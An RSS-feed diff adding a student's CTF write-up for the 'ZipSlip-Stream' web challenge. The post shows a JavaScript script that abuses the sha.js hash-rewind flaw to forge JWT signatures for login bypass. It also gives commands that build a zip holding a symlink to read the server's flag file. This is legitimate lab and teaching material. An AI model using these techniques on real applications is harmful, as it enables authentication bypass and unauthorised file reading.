@@ -3,7 +3,7 @@
 <title>Ojas Maheshwari&apos;s Blog Site</title>
 <link>https://ojasmaheshwari.github.io</link>
 <description>&lt;p&gt;Hi, I am Ojas Maheshwari&lt;br&gt;I am a C++ programmer and currently a college student.&lt;/p&gt;&lt;p&gt;I am a GSoC contributor at KDE right now.&lt;br&gt;I shall document my learnings and my journey through this blog feed.&lt;br&gt;I might also occasionally add some tech articles about other things when I feel like it.&lt;/p&gt;&lt;p&gt;You can reach out to me at workonlyojas@gmail.com if you feel like it.&lt;/p&gt;&lt;p&gt;Thanks for reading :D&lt;/p&gt;</description>
-<lastBuildDate>Thu, 06 Aug 2026 11:51:52 +0000</lastBuildDate>
+<lastBuildDate>Sat, 15 Aug 2026 19:25:27 +0000</lastBuildDate>
 <item>
 <title>Introductory Blog</title>
 <link>https://ojasmaheshwari.github.io/b/2026/introductory-blog</link>
@@ -240,6 +240,118 @@ Have a great day ☺️</p>
 <author>Ojas Maheshwari</author>
 <guid isPermaLink="true">https://ojasmaheshwari.github.io/b/2026/week-8-week-9-reviews-and-subsetting-form-fields</guid>
 <pubDate>Thu, 06 Aug 2026 11:51:52 +0000</pubDate>
+</item>
+<item>
+<title>ZipSlip-Stream WriteUp | InCTF 2026 CTF Finals | First and Only Blood</title>
+<link>https://ojasmaheshwari.github.io/b/2026/zipslip-stream-writeup-inctf-2026-ctf-finals-first-and-only-blood</link>
+<description>This blog post is a writeup for the ZipSlip-Stream web exploitation CTF challenge at InCTF 2026 Finals event.</description>
+<content:encoded><![CDATA[<h2>Introduction</h2>
+<p>This challenge felt tough. Even though I was the only person who solved this challenge, it's also the case that this is the only challenge I was able to solve in 8 hours.</p>
+<p>Since there were special protections against the use of AI and LLMs, it felt especially good after solving this challenge.</p>
+<p>Okay, so let's start without further ado,</p>
+<h2>Source code</h2>
+<p>https://drive.google.com/file/d/1AFEC93XON668Gq5I8eoVTy1gRgTpvN58/view?usp=sharing</p>
+<h2>Understanding the application</h2>
+<p>We are given source code of a web application. We can build it locally using docker.</p>
+<img src="https://i.ibb.co/M5Pfvvr8/1.png" width=1000 height=600>
+<p>By reading through the source code and playing with the website, we can understand a couple of things:</p>
+<ul>
+<li>
+<p>There's functionality to log-in but no sign-up.</p>
+</li>
+<li>
+<p>Only authenticated users (logged in) can upload files.</p>
+</li>
+<li>
+<p>Since the flag is in the filesystem and there is no route in the application that interacts with the flag, we probably need RCE or some sort of LFI.</p>
+</li>
+</ul>
+<h2>Subtask 1: Log-in somehow, anyhow!</h2>
+<p>It's pretty clear we need to be authenticated to do anything in this application. But there's no way for us to sign-up or register in the application and the admin's password is random and there's no way we can guess it.</p>
+<p>So we need to dig deeper.</p>
+<h3>CVE CVE-2025-9288 | sha.js hash rewind</h3>
+<p>If you try to audit the package versions inside package.json, you'll quickly find that <code>sha.js</code> which uses <code>2.4.10</code> has a critical vulnerability.</p>
+<p>You can read more about this vulnerability on it's github advisory: https://github.com/advisories/GHSA-95m3-7q98-8xr5</p>
+<p>This CVE can be little bit tricky to understand if you are seeing anything like this for the first time, like me.</p>
+<p>You should ideally play around with it and try to understand it yourself, but let me give you the gist of it.</p>
+<p>We can pass specially crafted data to the library's update function which triggers something known as a hash rewind.</p>
+<p>For example, this is how it's normally supposed to be:</p>
+<pre><code>&gt; require('sha.js')('sha256').update('foo').digest('hex')
+'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'
+</code></pre>
+<p>But if we do,</p>
+<pre><code>&gt; require('sha.js')('sha256').update('foobar').update({ length: -3 }).digest('hex')
+'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'
+</code></pre>
+<p>Notice how we get the same hashes in both the examples even though the data entered is different?
+The CVE is that we can pass data of type Object like <code>{ length: -offset }</code> and it will rewind the hash function's internal state back by <code>offset</code> times which may cause undefined behavior or hash collisions like in our case.
+We can even DOS the server by using this technique but it's not useful in our case.</p>
+<p>Now, an even harder challenge is to figure out how you could use this to login to the application. I spent 2-3 hours at this step.</p>
+<h3>If we can travel to the past, let's also try to visit the future</h3>
+<p>This line is the reason for our whole suffering:</p>
+<pre><code>const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);
+</code></pre>
+<p>We don't know what <code>secret</code> is. So we can never make <code>expectedSignatureHex</code> to be equal to our own created JWT signature.</p>
+<p>After a lot of thinking and trail-and-error, I figured out I could also bite off the signature part in my hash rewind.</p>
+<pre><code>&gt; require('sha.js')('sha256').update('foo').update({ length: -5 }).update('xyz').digest('hex')
+'594e519ae499312b29433b7dd8a97ff068defcba9755b6d5d00e84c524d67b06'
+&gt; require('sha.js')('sha256').update('z').digest('hex')
+'594e519ae499312b29433b7dd8a97ff068defcba9755b6d5d00e84c524d67b06'
+</code></pre>
+<p>Note how I did the -5 in the 1st command and it skipped &quot;xy&quot; and we get the hash for &quot;z&quot; only. We traveled to the future.</p>
+<p>We can use this trick to skip the entire secret except the last character. The last character can be one of the 16 hex characters.</p>
+<pre><code>const JWT_SECRET = crypto.randomBytes(9).toString('hex');
+</code></pre>
+<p>It will be 18 characters, 9 * 2 = 18.</p>
+<p>Therefore, we can craft a brute-force attack with our hash rewind payload. We need to pass the hashes of all the 16 hex characters in the JWT signature and one of them will match and the authentication will be successful.</p>
+<p>This is the JS script which will give you all the 16 possible JWT tokens:</p>
+<pre><code>const sha = require('sha.js');
+
+const HEADER = { alg: 'HS256' };
+const HEADER_json_str_len = JSON.stringify(HEADER).length;
+const PAYLOAD = { length: -(HEADER_json_str_len + 18) + 1, exp: Math.floor(Date.now() / 1000) + 100000 };
+const CHARSET = '0123456789abcdef';
+
+function genSig(c) {
+  const hash = sha('sha256');
+  return hash.update(c).digest('hex');
+}
+
+for (let i=0; i &lt; 16; i++) {
+  const c = CHARSET[i];
+  const sig = genSig(c);
+
+  const jwt = btoa(JSON.stringify(HEADER)) + &quot;.&quot; + btoa(JSON.stringify(PAYLOAD)) + &quot;.&quot; + sig;
+  console.log(jwt);
+}
+</code></pre>
+<p>Then you can use Burp intruder and pass these tokens in the cookies (cookie name is keycode_signal) and you'll find one of them works.</p>
+<img src="https://i.ibb.co/WNmPF9qp/image.png" width=1000 height=600>
+<h2>Subtask 2: ZipSlip??</h2>
+<p>Now we can upload some files. Since the name of the challenge is &quot;ZipSlip-Stream&quot;, you might try the simple ZipSlip but it won't work.</p>
+<p>And it will be obvious why it won't work because the Dockerfile installs the latest version of <code>unzip</code> which is 99.99% NOT VULNERABLE to ZipSlip</p>
+<pre><code>RUN apt-get update \
+	&amp;&amp; apt-get install -y unzip \
+	&amp;&amp; rm -rf /var/lib/apt/lists/*
+</code></pre>
+<p>To be honest, I required a hint at this point by the challenge author.</p>
+<p>So the answer is.....</p>
+<h3>Symlink LFI</h3>
+<p>You will realize we aren't just limited to uploading zip files. But uploading a web shell won't work since this is an express server.</p>
+<p>So we can exfiltrate the flag using a symlink file. But the important part is to keep the symlink inside the zip file.</p>
+<p>We know the exact location of the flag, it's in root.</p>
+<p>So we do</p>
+<pre><code>ln -s ../../../../../../../../../../flag evil
+zip -y evil.zip evil
+</code></pre>
+<p>Then we upload this zip file (make sure to keep the name as &quot;zip&quot; to bypass the regex) and BOOM! We can download the flag by visiting our uploaded file. (/uploads/&lt;some_hex&gt;/evil)</p>
+<p>If you have any doubts, feel free to put them in the comment section of this blog :)</p>
+<p>Thank you,</p>
+<p>Ojas</p>
+]]></content:encoded>
+<author>Ojas Maheshwari</author>
+<guid isPermaLink="true">https://ojasmaheshwari.github.io/b/2026/zipslip-stream-writeup-inctf-2026-ctf-finals-first-and-only-blood</guid>
+<pubDate>Sat, 15 Aug 2026 19:25:27 +0000</pubDate>
 </item>
 </channel>
 </rss>
